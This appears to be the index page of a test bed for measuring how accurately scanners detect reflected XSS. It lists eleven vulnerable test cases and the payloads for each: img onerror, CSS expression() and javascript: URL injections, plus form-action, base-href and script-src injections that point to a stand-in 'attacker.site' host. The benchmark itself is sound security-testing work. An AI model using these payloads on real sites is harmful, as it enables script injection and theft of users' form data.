<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Evaluation of Reflected XSS Detection Accuracy - HTTP GET Method - Experimental</title>
</head>
<body>

<%
	String anticsrf = (String)request.getSession().getAttribute("anticsrf");
	if(anticsrf == null) {
		//Generate and store a new token
		anticsrf = "" + Math.random();
		request.getSession().setAttribute("anticsrf", anticsrf);
	}
%>

<font size="5">Test Cases:</font><br><br>
<B><a href="Case01-Tag2HtmlPageScope-StripScriptTag.jsp?userinput=textvalue">Case01-Tag2HtmlPageScope-StripScriptTag.jsp</a></B><br>
  Injection of tags to the scope of the HTML page that strips script tags.<br>
  (Contributed by the <b>OWASP Zed Attack Proxy (ZAP) project</b>, via Simon Bennetts)<br>
  <U>Barriers:</U><br>
  Script tags are stripped from the input<br>
  <U>Sample Exploit Structures:</U><br>
  &lt;input type=text [dhtmlevent]=&quot;[code]&quot;&gt;<br>
  &lt;[customtag] style=&quot;width: expression&#40;[exploit code]&#41;;&quot;&gt;<br>
  <U>Examples:</U><br>
  Silent Exploit: &lt;img src=&quot;a&quot; onerror=&quot;javascript:document&#46;title=document&#46;domain&quot;&gt;<br>
  IE Custom Tag Exploit: &lt;sectooladdict style=&quot;width: expression&#40;document&#46;title=document&#46;domain&#41;;&quot;&gt;<br>
  <br>
  
<B><a href="Case02-Tag2HtmlPageScope-SecretVectorPOST.jsp?userinput=textvalue">Case02-Tag2HtmlPageScope-SecretVectorPOST.jsp</a></B><br>
  Injection of tags to the scope of the HTML page that that only relies on secret POST input.<br>
  (Contributed by the <b>OWASP Zed Attack Proxy (ZAP) project</b>, via Simon Bennetts)<br>
  <U>Barriers:</U><br>
  Secret input vector without any hints<br>
  <U>Sample Exploit Structures:</U><br>
  &lt;script&gt;[exploit code]&lt;/script&gt;<br>
  &lt;input type=text [dhtmlevent]=&quot;[code]&quot;&gt;<br>
  &lt;[customtag] style=&quot;width: expression&#40;[exploit code]&#41;;&quot;&gt;<br>
  <U>Examples:</U><br>
  Exploit: &#60;script&#62;document&#46;title&#61;&#34;Exploit&#34;&#59;&#60;&#47;script&#62;<br>
  Silent Exploit: &lt;img src=&quot;a&quot; onerror=&quot;javascript:document&#46;title=document&#46;domain&quot;&gt;<br>
  IE Custom Tag Exploit: &lt;sectooladdict style=&quot;width: expression&#40;document&#46;title=document&#46;domain&#41;;&quot;&gt;<br>
  <br>
  
<B><a href="Case03-Tag2HtmlPageScope-ConstantAntiCSRFToken.jsp?anticsrf=<%=anticsrf%>&userinput=textvalue">Case03-Tag2HtmlPageScope-ConstantAntiCSRFToken.jsp</a></B><br>
  Injection of tags to the scope of the HTML page that requires a constant session stored AntiCSRF token.<br>
  (Contributed by the <b>OWASP Zed Attack Proxy (ZAP) project</b>, via Simon Bennetts)<br>
  <U>Barriers:</U><br>
  Requires a constant session-specific AntiCSRF token<br>
  <U>Sample Exploit Structures (alongside the AntiCSRF token):</U><br>
  &lt;script&gt;[exploit code]&lt;/script&gt;<br>
  &lt;input type=text [dhtmlevent]=&quot;[code]&quot;&gt;<br>
  &lt;[customtag] style=&quot;width: expression&#40;[exploit code]&#41;;&quot;&gt;<br>
  <U>Examples (alongside the AntiCSRF token):</U><br>
  Exploit: &#60;script&#62;document&#46;title&#61;&#34;Exploit&#34;&#59;&#60;&#47;script&#62;<br>
  Silent Exploit: &lt;img src=&quot;a&quot; onerror=&quot;javascript:document&#46;title=document&#46;domain&quot;&gt;<br>
  IE Custom Tag Exploit: &lt;sectooladdict style=&quot;width: expression&#40;document&#46;title=document&#46;domain&#41;;&quot;&gt;<br>
  <br>
  
<B><a href="Case04-Tag2HtmlPageScope-ChangingAntiCSRFToken.jsp">Case04-Tag2HtmlPageScope-ChangingAntiCSRFToken.jsp</a></B><br>
  Injection of tags to the scope of the HTML page that requires an expiring one-use session stored AntiCSRF token.<br>
  (Contributed by the <b>OWASP Zed Attack Proxy (ZAP) project</b>, via Simon Bennetts)<br>
  <U>Barriers:</U><br>
  Requires a changing, newly generated session-specific AntiCSRF token<br>
  <U>Sample Exploit Structures (alongside the AntiCSRF token):</U><br>
  &lt;script&gt;[exploit code]&lt;/script&gt;<br>
  &lt;input type=text [dhtmlevent]=&quot;[code]&quot;&gt;<br>
  &lt;[customtag] style=&quot;width: expression&#40;[exploit code]&#41;;&quot;&gt;<br>
  <U>Examples (alongside the AntiCSRF token):</U><br>
  Exploit: &#60;script&#62;document&#46;title&#61;&#34;Exploit&#34;&#59;&#60;&#47;script&#62;<br>
  Silent Exploit: &lt;img src=&quot;a&quot; onerror=&quot;javascript:document&#46;title=document&#46;domain&quot;&gt;<br>
  IE Custom Tag Exploit: &lt;sectooladdict style=&quot;width: expression&#40;document&#46;title=document&#46;domain&#41;;&quot;&gt;<br>
  <br>
  
 <B><a href="Case05-ScriptlessInjectionInFormTagActionAttribute.jsp?userinput=textvalue">Case05-ScriptlessInjectionInFormTagActionAttribute.jsp</a></B><br>
  Scriptless Injection in HTML Form Tag Action Attribute scope of the HTML page.<br>
  (Contributed by the <b>IronWASP project</b>, via Lavakumar Kuppan)<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (double quote)<br>
  Partial HTML encoding (single quote)<br>
  Removal of : character to prevent 'javascript:' insertion<br>
  <U>Sample Exploit Structures:</U><br>
  http://[attacker url]/<br>
  <U>Examples:</U><br>
  Exploit: http://attacker.site/save_form_info.jp<br>
  <br>
  
<B><a href="Case06-ScriptlessInjectionInBaseTagHrefAttribute.jsp?userinput=textvalue">Case06-ScriptlessInjectionInBaseTagHrefAttribute.jsp</a></B><br>
  Scriptless Injection in HTML Base Tag Href Attribute scope of the HTML page.<br>
  (Contributed by the <b>IronWASP project</b>, via Lavakumar Kuppan)<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (double quote)<br>
  Partial HTML encoding (single quote)<br>
  Removal of : character to prevent 'javascript:' insertion<br>
  <U>Sample Exploit Structures:</U><br>
  http://[attacker_url]/<br>
  <U>Examples:</U><br>
  Exploit: http://attacker.site/<br>
  <br>
  
<B><a href="Case07-ScriptlessInjectionInScriptTagSrcAttribute.jsp?userinput=textvalue">Case07-ScriptlessInjectionInScriptTagSrcAttribute.jsp</a></B><br>
  Scriptless Injection in HTML Script Tag Src Attribute scope of the HTML page.<br>
  (Contributed by the <b>IronWASP project</b>, via Lavakumar Kuppan)<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  Partial HTML encoding (double quote)<br>
  Partial HTML encoding (single quote)<br>
  Removal of : character to prevent 'javascript:' insertion<br>
  <U>Sample Exploit Structures:</U><br>
  http://[attacker_url]/<br>
  <U>Examples:</U><br>
  Exploit: http://attacker.site/malicious_script.js<br>
  <br>
  
  <B><a href="Case08-InjectionInToCssSelector.jsp?userinput=textvalue">Case08-InjectionInToCssSelector.jsp</a></B><br>
  Injection in CSS Selector<br>
  (Contributed by the <b>IronWASP project</b>, via Lavakumar Kuppan)<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  <U>Sample Exploit Structures:</U><br>
  [Selector] {[Property]:[Value that leads to Script Execution]} [Selector]<br>
  <U>Examples:</U><br>
  Exploit: body {width:expression('alert(123)')} x  <br>
  Exploit: body {background-image:url(javascript:'alert(123)')} x <br>
  <br>
  
 <B><a href="Case09-InjectionInToCssSelectorAttributeName.jsp?userinput=textvalue">Case09-InjectionInToCssSelectorAttributeName.jsp</a></B><br>
  Injection in CSS Selector Atrribute Name<br>
  (Contributed by the <b>IronWASP project</b>, via Lavakumar Kuppan)<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  <U>Sample Exploit Structures:</U><br>
  [Attribute Name]=[Attribute Value]] {[Propery]:[Value]} [Selector] {[Property]:[Value that leads to Script Execution]} [Selector][[Attribute Name]<br>
  <U>Examples:</U><br>
  Exploit: aa=aa] {aa:aa} body {width:expression('alert(123)')} aa[aa  <br>
  Exploit: aa=aa] {aa:aa} body {background-image:url(javascript:'alert(123)')} aa[aa <br>
  <br>
  
<B><a href="Case10-InjectionInToCssProperty.jsp?userinput=textvalue">Case10-InjectionInToCssProperty.jsp</a></B><br>
  Injection in CSS Property<br>
  (Contributed by the <b>IronWASP project</b>, via Lavakumar Kuppan)<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  <U>Sample Exploit Structures:</U><br>
  [Property]:[Value that leads to Script Execution]; [Property]<br>
  <U>Examples:</U><br>
  Exploit: width:expression('alert(123)'); x  <br>
  Exploit: background-image:url(javascript:'alert(123)'); x <br>
  <br>
  
<B><a href="Case11-InjectionInToCssPropertyValue.jsp?userinput=textvalue">Case11-InjectionInToCssPropertyValue.jsp</a></B><br>
  Injection in CSS Property Value<br>
  (Contributed by the <b>IronWASP project</b>, via Lavakumar Kuppan)<br>
  <U>Barriers:</U><br>
  Partial HTML encoding (angle brackets)<br>
  <U>Sample Exploit Structures:</U><br>
  [Value]; [Property]:[Value that leads to Script Execution]; [Property]: [Value]<br>
  <U>Examples:</U><br>
  Exploit: aa; width:expression('alert(123)'); xx:aa  <br>
  Exploit: aa; background-image:url(javascript:'alert(123)'); xx:aa <br>
  <br>
  
</body>
</html>